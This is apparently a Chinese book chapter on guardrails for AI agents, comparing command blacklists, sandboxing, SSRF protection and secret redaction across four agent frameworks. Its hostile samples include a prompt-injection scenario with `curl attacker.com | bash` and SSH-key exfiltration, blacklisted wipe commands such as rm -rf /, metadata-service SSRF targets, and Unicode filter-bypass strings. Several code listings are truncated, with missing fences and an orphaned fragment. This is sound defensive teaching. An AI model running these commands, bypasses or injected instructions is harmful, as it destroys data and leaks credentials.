# 第9章 职业底线——安全防护

> "实习生可以笨手笨脚、可以效率不高，但有一条红线绝对不能碰——不能把公司机密发到网上、不能随意删服务器上的文件、不能点开钓鱼邮件里的链接。安全防护，就是给 Agent 划定这条'职业底线'。"

---

## 9.1 开篇故事：小李的安全培训

实习生小李入职第一天，IT 部门给他做了一场安全培训。

**第一层：什么绝对不能做**

"这几件事，做了直接走人——"IT 主管板着脸说："第一，不能运行 `rm -rf /` 这种命令，会把整台服务器清空；第二，不能格式化硬盘；第三，不能随意关机重启。"小李把这些写在了笔记本第一页，标了三个红五角星。

**第二层：做什么之前要先问**

"还有一些事，不是不能做，但要先请示——"主管接着说："访问公司外部的网站要小心，别被钓鱼；执行不熟悉的脚本前要确认来源；修改核心配置文件前先备份。"小李把这些标了黄色问号。

**第三层：日常习惯的养成**

"最后，养成好习惯——"主管的语气缓和下来："日志里如果出现了 API Key 或密码，要自动打码；别人发给你的链接，先检查一下是不是内网地址；不确定的文件，别随便打开。"

**Agent 的安全防护，就是这位实习生的"安全培训手册"。**

但 Agent 面临一个实习生没有的问题：它的"手"（工具系统）可以执行代码、读写文件、访问网络，而它的"脑子"（LLM）可能会被恶意 prompt 诱导做出危险操作。一个精心构造的 prompt 可以让 Agent 把 `~/.ssh/id_rsa` 的内容发到一个外部 URL，或者在无意识中执行 `curl attacker.com | bash`。

安全防护要做的，就是在 Agent 的"手"伸向危险区域之前，把它拉回来。

---

## 9.2 业务概念：安全防护是什么

**安全防护（Security Protection）**是 Agent 系统的"职业底线守卫"。它负责确保 Agent 在执行任务的过程中，不会对宿主系统、网络边界、敏感数据造成不可逆的损害。

### 技术定义

安全防护不是简单的"加个密码"。它包含三个层面：

1. **执行控制层**：在危险操作（如 shell 命令、文件删除）执行前进行拦截或审批
2. **边界防护层**：限制 Agent 能访问的范围（文件系统沙箱、网络访问白名单）
3. **泄露防护层**：防止敏感信息（API Key、密码、Token）在日志或输出中暴露

> 💡 **名词解释：SSRF（Server-Side Request Forgery，服务器端请求伪造）**
>
> 通俗地说：实习生被骗子诱导，帮骗子打开了公司内部的一扇门。骗子自己进不来，但实习生帮他探了路。
>
> 技术定义：攻击者通过构造恶意 prompt，诱导 Agent 访问内部网络服务（如 `http://127.0.0.1:8080/admin` 或云元数据服务 `http://169.254.169.254`），从而窃取凭证或遍历内部 API。这是 Agent 系统最常见的网络层攻击面。

### 一句话说清边界

- **安全防护负责**：命令审批、文件系统边界、网络访问控制、敏感信息脱敏、恶意代码检测
- **安全防护不负责**：具体工具怎么实现（那是工具系统）、用户认证（那是网关系统）、数据加密传输（那是基础设施）

### 没有安全防护会怎样？

如果把安全防护从 Agent 中拿掉：

- **数据可被一键清空**：`rm -rf /` 或 `mkfs` 等命令会直接执行，没有任何拦截
- **云凭证可被窃取**：Agent 被诱导访问云元数据服务，AWS/GCP 临时凭证直接泄露
- **敏感文件可被外传**：`~/.ssh/id_rsa`、`.env` 文件的内容可以被包装成"分析任务"发送出去
- **日志成为泄密渠道**：API Key、数据库密码被永久写入日志文件，任人翻阅
- **恶意插件可被静默安装**：包含后门代码的 Skill/插件被加载到 Agent 的 toolset 中

## 9.3 必要设计：所有 Agent 都必须有的"底线"

从四个项目中提炼共性，安全防护的**最小可行实现**只需要以下四个要素：

### 要素一：危险命令拦截

在 shell 命令执行前，至少要有黑名单匹配，拦截最危险的命令（`rm -rf /`、`mkfs`、`dd if=/dev/zero` 等）。这是"地板"——无论其他安全策略怎么配置，这些命令绝不能执行。

### 要素二：文件系统边界

文件读写操作必须限制在指定目录内，防止 `../../etc/passwd` 这类路径遍历攻击。最简单的实现：用 `Path.resolve()` 解析后再检查是否在允许目录下。

### 要素三：网络访问控制

HTTP 请求前检查目标地址，拒绝私有 IP 和云元数据端点。至少要做到：解析域名后的 IP 如果是内网地址，就拒绝请求。

### 要素四：敏感信息脱敏

日志和输出中自动识别并掩码 API Key、Token、密码等敏感数据。最简单的实现：用正则匹配已知前缀（`sk-`、`ghp_`、`AKIA` 等），替换为 `***`。

```python
# 所有 Agent 都必须有的"最小可行安全防护"
# 就像实习生的"安全培训最低要求"

DANGEROUS_PATTERNS = [
    r'\brm\s+(-[^\s]*\s+)*(/|/\*|/ \*)(\s|$)',   # 删根目录
    r'\bmkfs(\.[a-z0-9]+)?\b',                     # 格式化
    r'\bdd\b[^\n]*\bof=/dev/sd',                   # 写裸设备
]

def execute_command(command, allowed_dir=None):
    # ① 危险命令拦截
    for pattern in DANGEROUS_PATTERNS:
        if re.search(pattern, command):
            return "BLOCKED: dangerous command detected"
    
    # ② 文件系统边界（如果配置了）
    if allowed_dir:
        for path in extract_paths(command):
            resolved = Path(path).resolve()
            if not _is_under(resolved, allowed_dir):
                return f"BLOCKED: path {path} outside allowed directory"
    
    return subprocess.run(command, shell=True, capture_output=True, text=True)

def fetch_url(url):
    # ③ 网络访问控制
    hostname = urlparse(url).hostname
    infos = socket.getaddrinfo(hostname, None)
    for info in infos:
        addr = ipaddress.ip_address(info[4][0])
        if addr.is_private or addr.is_loopback:
            return "BLOCKED: private IP address"
    return requests.get(url)

def log_message(text):
    # ④ 敏感信息脱敏
    text = re.sub(r'sk-[a-zA-Z0-9]{20,}', '***', text)
    text = re.sub(r'ghp_[a-zA-Z0-9]{36}', '***', text)
    logger.info(text)
```

**这就是"底线"**。少于这四点，Agent 的安全防护就不完整：

| 要素 | 少了会怎样 |
|------|-----------|
| 危险命令拦截 | `rm -rf /` 被直接执行，数据永久丢失 |
| 文件系统边界 | 路径遍历攻击可读取任意敏感文件 |
| 网络访问控制 | SSRF 攻击可窃取云凭证、遍历内网 |
| 敏感信息脱敏 | API Key 永久写入日志，成为泄密隐患 |

## 9.4 四个项目的实现对比

四个框架在"底线"之上，基于各自的场景诉求构建了截然不同的安全体系。

### Hermes Agent："分层纵深 + 多面协同"的防御网

**设计定位**：安全要分层、各层独立生效、没有任何单点绕过能穿透整套防线——适合同时服务多个用户、执行环境复杂的高风险网关型 Agent。

> 💡 **名词解释：HARDLINE（硬线）与 DANGEROUS（危险线）**
>
> 通俗地说：公司有两条纪律——"绝对不能碰的高压线"（泄露商业机密、删库）和"需要审批才能做的敏感操作"（访问客户数据、修改生产配置）。前者没有任何商量余地，后者可以申请。
>
> 技术定义：Hermes 将命令检测分为两层。HARDLINE（12 条模式）是"安全地板"——即使管理员开启了 YOLO 模式或审批关闭，这些命令仍然被绝对禁止（如 `rm -rf /`、`mkfs`、`fork bomb`）。DANGEROUS（47 条模式）是"可协商边界"——命中后进入审批流程，用户可选择允许单次、允许本会话或永久允许。

> 💡 **名词解释：YOLO 模式**
>
> 通俗地说：主管对实习生的信任度开关。"YOLO = 你说了算"——主管说"我信任你，一般的敏感操作你自己决定，但绝对不能碰的高压线还是不行"。
>
> 技术定义：Hermes 通过环境变量 `HERMES_YOLO_MODE` 或 `/yolo` 命令开启的信任模式。开启后，所有 DANGEROUS 级别的命令自动通过，但 HARDLINE 仍然不可绕过。这平衡了"高级用户效率"与"底线安全"。

> 💡 **名词解释：tirith 安全扫描**
>
> 通俗地说：公司请了一个外部安全顾问，专门检查实习生要执行的命令里有没有隐藏的风险（如同形字符伪装、管道注入）。这个顾问有自己的专业工具，不是公司的内部员工。
>
> 技术定义：Hermes 调用外部 Rust 二进制 `tirith` 对命令做深度内容分析，exit code 0/1/2 分别对应 allow/block/warn。自动下载时通过 SHA-256 + cosign 双重校验保证供应链安全。

# Hermes 的安全防护：像一家有严格安全部门的大型外包公司

class HermesSecuritySystem:
    def execute_command(self, command, session_key):
        # ① 命令归一化：消除全角字符、ANSI 转义、null bytes 等绕过手段
        normalized = _normalize_command_for_detection(command)
        
        # ② HARDLINE 检测——绝对禁止，没有任何商量余地
        if detect_hardline_command(normalized):
            return {"approved": False, "hardline": True}  # 不可绕过
        
        # ③ YOLO 模式？高级用户信任开关，但 HARDLINE 仍然生效
        if self._is_yolo_enabled(session_key):
            return {"approved": True}  # 跳过 DANGEROUS，但 HARDLINE 已在前一步拦截
        
        # ④ DANGEROUS 模式匹配（47 条可审批规则）
        dangerous = detect_dangerous_command(normalized)
        
        # ⑤ tirith 外部二进制深度扫描
        tirith_result = check_command_security(command)
        
        warnings = collect_warnings(dangerous, tirith_result)
        if not warnings:
            return {"approved": True}
        
        # ⑥ 审批状态查询：这个命令之前有没有被批准过？
        if self._is_already_approved(session_key, warnings):
            return {"approved": True}
        
        # ⑦ 交互式/网关审批：once / session / always / deny
        choice = self._request_approval(session_key, warnings)
        if choice == "deny":
            return {"approved": False}
        self._persist_approval(session_key, choice, warnings)
        return {"approved": True}
    
    def fetch_url(self, url):
        # ⑧ SSRF 防护：DNS 解析后检查 IP 是否私有
        if not is_safe_url(url):   # 包含 _ALWAYS_BLOCKED_IPS（云元数据端点）
            return "BLOCKED: unsafe URL"
        return self.http.get(url)
    
    def log(self, text):
        # ⑨ 日志脱敏：30+ 种已知前缀自动掩码
        safe = redact_sensitive_text(text)
        self.logger.info(safe)
```

### nanobot："纵深防御三层面"的轻量安全体系

**设计定位**：安全要小而美、零外部依赖、三层独立生效——适合个人助手场景。

> 💡 **名词解释：allowFrom（渠道准入白名单）**
>
> 通俗地说：公司前台的电话转接规则——"没有登记过的人，电话一律不接"。不是"先接了再判断"，而是在电话响起的那一刻就决定是否转分机。
>
> 技术定义：nanobot 在 `BaseChannel.is_allowed()` 中对每个进入系统的消息检查 `sender_id` 是否在白名单中。默认空列表 = 拒绝所有（fail-closed），用户必须显式配置 `"*"` 或具体 ID 才能开启访问。

> 💡 **名词解释：restrict_to_workspace（工作区限制）**
>
> 通俗地说：IT 部门给实习生配了一台专门的电脑，所有工作只能在这台电脑上做，不能访问公司其他服务器上的文件。
>
> 技术定义：nanobot 在 `AgentLoop` 初始化时，根据配置决定是否将文件工具的 `allowed_dir` 设置为 workspace 目录。文件读写操作通过 `Path.resolve()` + `relative_to()` 严格检查是否在该目录内，防止路径遍历和符号链接逃逸。

### OpenClaw："五层过滤管道"的生产级纵深防御

**设计定位**：AI Agent 的安全必须是"默认拒绝、显式允许"的纵深防御，每一层都有独立恢复策略——适合 7×24 小时运行的生产级网关。

> 💡 **名词解释：Docker 沙箱（Sandbox）**
>
> 通俗地说：公司给实习生配了一个"透明玻璃房"——他在里面可以随意操作，但所有动作都被隔离，即使搞砸了也影响不到外面的办公室。
>
> 技术定义：OpenClaw 使用 Docker 容器作为命令执行环境，通过受限的 bind mount（只挂载工作目录）、非 host 网络模式、seccomp/apparmor 配置，将 Agent 的执行范围严格限制在容器内。`validateSandboxSecurity` 在创建容器前拦截危险配置（如挂载 `/proc`、`/sys` 或 Docker Socket）。

> 💡 **名词解释：DNS 固定（DNS Pinning）**
>
> 通俗地说：骗子说"你去这个地址找我"，实习生先查了一下这个地址的实际门牌号，然后把它记下来。之后不管骗子怎么改 DNS 记录，实习生只认那个记下来的门牌号——防止骗子用"合法域名指向内网地址"的手段骗人。
>
> 技术定义：OpenClaw 在 SSRF 防护中采用 DNS Pinning 技术。第一次解析域名后，将 hostname 和 IP 地址绑定，后续请求通过自定义 lookup 函数返回固定的 IP，彻底杜绝 DNS Rebinding 攻击。

> 💡 **名词解释：SecretRef（密钥引用）**
>
> 通俗地说：公司的门禁卡不是放在公共区域的抽屉里，而是放在保险箱里，抽屉里只放了一张"请到保险箱取卡"的纸条。即使抽屉被人翻了，也拿不到真正的卡。
>
> 技术定义：OpenClaw 的 `SecretRef` 抽象让配置文件中只保留密钥引用（如 `"$ref": {"source": "env", "key": "OPENAI_API_KEY"}`），实际值在运行时从环境变量、文件或外部命令安全获取。实现"配置与密钥分离"，防止配置文件泄露导致凭证曝光。

    }
    
    async audit() {
        // ⑦ 安全审计：配置检查 + 文件系统检查 + 网关探活
        const findings = [
            ...collectGatewayConfigFindings(cfg),
            ...collectFilesystemFindings(),
            ...(await maybeProbeGateway()),
        ];
        return findings;  // 结构化报告，含 severity 和 remediation
    }
}
```

### OpenCode："安检系统"的规则引擎防御

**设计定位**：权限检查要下沉到工具层、用规则引擎灵活配置、用 AST 精确解析——适合和 IDE 深度集成、需要精细化权限控制的场景。

> 💡 **名词解释：PermissionNext（权限规则引擎）**
>
> 通俗地说：公司的权限系统不是"能进/不能进"两个档，而是"直接放行""需要审批""绝对禁止"三档，而且支持通配符——比如"所有 markdown 文件可以直接编辑，其他文件需要审批"。
>
> 技术定义：OpenCode 的 `PermissionNext` 规则引擎支持 `allow/deny/ask` 三种动作，通过 `Wildcard.match` 进行通配符匹配（如 `edit:*.md`）。规则按"后定义优先"的原则合并，默认回退到 `ask`（安全优先）。

> 💡 **名词解释：Bash AST 解析**
>
> 通俗地说：以前检查命令靠"关键词搜索"，看到 `rm` 就紧张。现在改成了"语法分析"——像语文老师分析句子结构一样，能区分 "`rm old_file.txt`"（正常删除）和 "`rm -rf /`"（危险操作），还能处理管道、重定向等复杂结构。
>
> 技术定义：OpenCode 使用 tree-sitter 解析 Bash 命令的抽象语法树（AST），提取文件操作命令（`cd`、`rm`、`cp` 等）和外部目录访问，然后针对性地请求权限。比正则匹配更精确，能处理复杂命令结构。

**关键源码位置**：
- 规则引擎评估：`packages/opencode/src/permission/next.ts:131-161`
- Bash AST 解析：`packages/opencode/src/tool/bash.ts:78-160`
- 模型级工具过滤：`packages/opencode/src/tool/registry.ts:131-171`
- 敏感文件规则：`packages/opencode/src/agent/agent.ts:67-72`

```typescript
// OpenCode 的安全防护：像一个有智能门禁的设计工作室

class OpenCodeSecuritySystem {
    async evaluatePermission(request) {
        // ① 规则引擎评估：allow / deny / ask
        for (const pattern of request.patterns) {
            const rule = evaluate(request.permission, pattern, ruleset, approved);
            if (rule.action === "deny") throw new DeniedError();
            if (rule.action === "ask") {
                // 挂起执行，等用户响应
                return await askUser(request);
            }
        }
        return "allow";  // 所有 pattern 都通过
    }
    
    async executeBash(command, ctx) {
        // ② tree-sitter 解析 Bash AST
        const tree = await parser().then(p => p.parse(command));
        const directories = new Set<string>();
        const patterns = new Set<string>();
        
        for (const node of tree.rootNode.descendantsOfType("command")) {
            const cmd = extractCommandText(node);
            // 提取文件操作命令的外部目录访问
            if (["cd","rm","cp","mv","mkdir"].includes(cmd[0])) {
                for (const arg of cmd.slice(1)) {
                    const resolved = await fs.realpath(path.resolve(cwd, arg));
                    if (!Instance.containsPath(resolved)) {
                        directories.add(resolved);  // 越界访问，需要审批
                    }
                }
            }
            if (cmd[0] !== "cd") patterns.add(cmd.join(" "));
        }
        
        // ③ 权限下沉到工具层：bash 按命令模式、edit 按文件路径
        if (directories.size > 0) {
            await ctx.ask({ permission: "external_directory", patterns: [...directories] });
        }
        if (patterns.size > 0) {
            await ctx.ask({ permission: "bash", patterns: [...patterns] });
        }
    }
    
    getToolsForModel(model) {
        // ④ 模型级工具过滤：GPT 用 apply_patch，其他用 edit/write
        const usePatch = model.modelID.includes("gpt-") && !model.modelID.includes("oss");
        return allTools.filter(t => {
            if (t.id === "apply_patch") return usePatch;
            if (t.id === "edit" || t.id === "write") return !usePatch;
            return true;
        });
    }
}
```

## 9.5 独特高价值设计：各项目的闪光点

### Hermes Agent：HARDLINE 地板——"任何配置都不可绕过的安全底线"

`tools/approval.py:156-178`：HARDLINE_PATTERNS 是 Hermes 安全设计的精髓——即使管理员开启了 YOLO 模式、即使审批模式设为 `off`、即使通过 `--force` 强制安装，这些命令仍然被绝对禁止。

**解决的问题**：防止"过度信任"导致的安全事故。高级用户需要灵活度，但 `rm -rf /` 不应该因为"用户说自己知道在做什么"就放行。

**什么场景值得借鉴**：任何有"权限配置"或"信任模式"的 Agent 系统。无论上层怎么配置，总要保留一个"不可关闭"的安全地板。

### Hermes Agent：命令归一化——4 行代码挡住 Unicode 绕过攻击

`tools/approval.py:329-344`：在正则匹配前先 strip ANSI、strip null bytes、NFKC Unicode 归一化。没有这 4 行，`ｒｍ -ｒｆ /`（全角字符）或 `\x00rm\x00 -rf /`（null byte 截断）就能绕过所有检测。

**解决的问题**：攻击者用视觉相似但编码不同的字符绕过简单的字符串匹配。

**什么场景值得借鉴**：任何基于模式匹配的命令/输入过滤系统。

### nanobot：allowFrom 默认空列表——"fail-closed"的安全哲学

`nanobot/channels/base.py:79-87`：`allow_from` 默认空列表 = 拒绝所有访问。`channels/manager.py:60-66` 在启动时强制检查，空列表直接 `SystemExit`。

**解决的问题**：默认开放是大多数框架的"开发友好"选择，但对暴露在互联网的 AI Agent 来说，默认开放等于把 root shell 拱手让人。

**什么场景值得借鉴**：任何面向公网部署的 Agent 系统。安全默认优于开发便利。

### OpenClaw：DNS Pinning——彻底解决 SSRF 的 DNS Rebinding 攻击

`src/infra/net/ssrf.ts:276-323`：Phase 1 拦截字面量 → Phase 2 拦截解析结果 → `createPinnedLookup` 固化 DNS 结果。

**解决的问题**：传统 SSRF 防护只检查一次 DNS 解析结果，攻击者可以通过"TTL 极短的 DNS 记录"在检查时返回公网 IP、实际连接时返回内网 IP（DNS Rebinding）。DNS Pinning 将第一次解析结果固定，彻底杜绝这种绕过。

**什么场景值得借鉴**：任何需要防范 SSRF 的网络服务。

### OpenCode：PermissionNext 规则引擎——"三态 + 通配符"的灵活权限

`packages/opencode/src/permission/next.ts:131-161`：`allow/deny/ask` 三态 + `Wildcard.match` 通配符 + 后定义规则优先。

**解决的问题**：简单的布尔白名单无法表达"所有 markdown 文件可以直接编辑，其他文件需要审批"这类细粒度策略。

**什么场景值得借鉴**：任何需要用户可配置权限策略的系统（如 IDE 插件、文件管理工具）。

## 9.6 设计思想总结

如果我要自己构建一个 Agent 系统，安全防护部分的设计 checklist 是什么？

### 必须做（底线）

| Check | 项目 | 说明 |
|-------|------|------|
| ☐ | 危险命令拦截 | 至少黑名单匹配 `rm -rf /`、`mkfs`、`dd` 等不可恢复命令 |
| ☐ | 文件系统边界 | `Path.resolve()` + 目录 containment 检查，防止路径遍历 |
| ☐ | 网络访问控制 | DNS 解析后检查 IP 是否私有/内网，拦截 SSRF |
| ☐ | 敏感信息脱敏 | 日志和输出中自动掩码 API Key、Token、密码等 |

### 视场景而定（加分项）

| 场景 | 推荐设计 | 参考项目 |
|------|---------|---------|
| 多用户网关 / 高危执行环境 | 分层审批（HARDLINE + DANGEROUS）+ 外部安全扫描 + 工具循环熔断 | Hermes |
| 个人助手 / 极简部署 | 渠道白名单 + 工作区沙箱 + Shell 多层过滤 | nanobot |
| 7×24 生产级服务 | Docker 沙箱 + DNS Pinning + SecretRef + 安全审计 | OpenClaw |
| IDE 集成 / 精细化权限 | 规则引擎（allow/deny/ask）+ Bash AST 解析 + 模型级工具过滤 | OpenCode |
| 外部插件/Skill 生态 | 静态威胁扫描（数据外泄、提示注入、反向 shell） | Hermes + OpenClaw |
| 长会话 / 高预算场景 | 工具调用循环 guardrail（重复失败检测） | Hermes |

### 最重要的三条经验

1. **"安全地板"比"安全天花板"更重要**：无论你的系统有多少高级安全特性，如果没有一个"任何配置都不可绕过"的底线（如 Hermes 的 HARDLINE），整个安全体系就是沙滩上的城堡。

2. **默认拒绝优于默认允许**：nanobot 的 allowFrom 空列表拒绝所有、OpenClaw 的默认禁用危险工具、OpenCode 的默认回退到 `ask`——这三个设计共同说明：让用户"显式选择开放"比"忘记配置就暴露"安全得多。

3. **安全必须分层且各层独立生效**：Hermes 的检测层、决策层、执行层彼此解耦；nanobot 的渠道层、工具层、网络层互不依赖；OpenClaw 的五层过滤管道每层可独立替换。这才是"纵深防御"的真正含义——不是堆叠同一类型的检测，而是在不同层面用不同机制设防。
